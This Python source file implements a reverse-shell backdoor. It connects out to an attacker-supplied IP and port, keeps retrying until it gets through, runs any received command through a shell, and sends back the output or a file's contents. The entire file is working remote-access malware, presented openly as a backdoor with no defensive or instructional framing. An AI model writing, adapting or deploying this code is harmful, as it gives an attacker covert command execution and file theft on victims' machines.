#!usr/bin/env python3
import socket
import subprocess
import json
import sys
import os


class ReverseBackdoor:
	'''
	Reverse backdoor class creates a backdoor 
	by connecting to the attacker's machine 
	server through TCP socket. 
	params: ip(str), port(int)
	'''
	def __init__(self, ip:str, port:int)->None:
		self.port = port 
		self.ip = ip

		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connect_to_listener()
	

	def connect_to_listener(self):
		connected = False
		while not connected:
			try:
				self.connection.connect((self.ip,self.port))
				connected = True
				print('\r[*] Connection Established.')
			except ConnectionRefusedError:
				print('\r[-] Connection Refused.', end='')


	def serial_send(self, data:str or list):
		'''
		serialize data and send over TCP socket.
		'''
		bytes_json_data = json.dumps(data).encode('utf-8')
		# print('BD sent: ',bytes_json_data)
		self.connection.send(bytes_json_data)


	def serial_receive(self) -> str :
		'''
        receive serialized data over TCP socket
        and retrieve original data.
		'''
		bytes_json_data = b''
		while True:
			try:
				bytes_json_data += self.connection.recv(1024)
				data = json.loads(bytes_json_data)
				# print("Backdoor Rec: ", data)
				return data 
			except json.JSONDecodeError:
				continue


	def execute_command(self,command:str)->str:
		'''
		executes command and return command's output.
		'''
		return subprocess.check_output(command, shell=True).decode('utf-8')


	def cwd(self,path):
		'''
		change working directory to the passed path.
		'''
		os.chdir(path)
		return '[*] Path changed to ' + path


	def upload_file(self, path):
		'''
		upload file contents to the attacker server.
		'''
		with open(path, 'rb') as file:
			return file.read()


	def run(self):
		'''
		start backdoor.
		'''
		while True:
			try:
				command = self.serial_receive()
				
				# remove below line
				command_lst = command.split(' ')
				command_list_len = len(command_lst)==2
				cmd = command_lst[0]
				if command_list_len:
					path = command_lst[1]
				
				if cmd == 'exit':
					self.connection.close()
					sys.exit()
				
				elif cmd == 'cd' and command_list_len:
					command_output = self.cwd(path)
				
				elif cmd =='download' and command_list_len:
					file_content = self.upload_file(path)
					command_output = str(file_content, encoding='utf-8')

				else:
					command_output = self.execute_command(command)

				self.serial_send(command_output)

			except json.JSONDecodeError:
				print('[-] Lost Connection.')
				self.connect_to_listener

			except Exception as e:
				exception = ('[-] Exception : ' + str(e))
				self.serial_send(exception)

